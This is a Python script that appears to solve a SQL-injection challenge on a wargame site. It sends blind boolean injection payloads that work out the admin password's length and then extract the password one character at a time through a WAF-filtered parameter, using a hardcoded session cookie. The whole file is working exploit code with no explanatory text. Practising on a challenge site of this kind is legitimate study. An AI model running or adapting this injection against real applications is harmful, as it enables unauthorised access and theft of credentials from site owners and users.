import string
from urllib import response
import requests
url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
cookies = {"PHPSESSID" : "595dl7ejl1io50mt9bhg0dbmpk"}
params = {"id" : None}

for i in range(30):
    payload = "'||left(id,4)='admi'&&length(pw)={}#".format(i)
    params["id"] = payload
    print(params)
    response = requests.get(url,params=params,cookies=cookies)
    if("Forbidden" in response.text):
        print("Forbidden")
        print(payload)
        break
    elif("Hello admin" in response.text):
        print("find the pw length",i)
        break

flag = ''
for i in range(1,9):
    for j in string.printable:
        payload = "'||left(id,4)='admi'&&left(pw,{})='{}'#".format(i,flag + j)
        params["id"] = payload
        print(params)
        response = requests.get(url,params=params,cookies=cookies)
        if("Forbidden" in response.text):
            print("Forbidden")
            print(payload)
            break
        elif("Hello admin" in response.text):
            flag = flag + j
            print("find the pw ",flag)
            break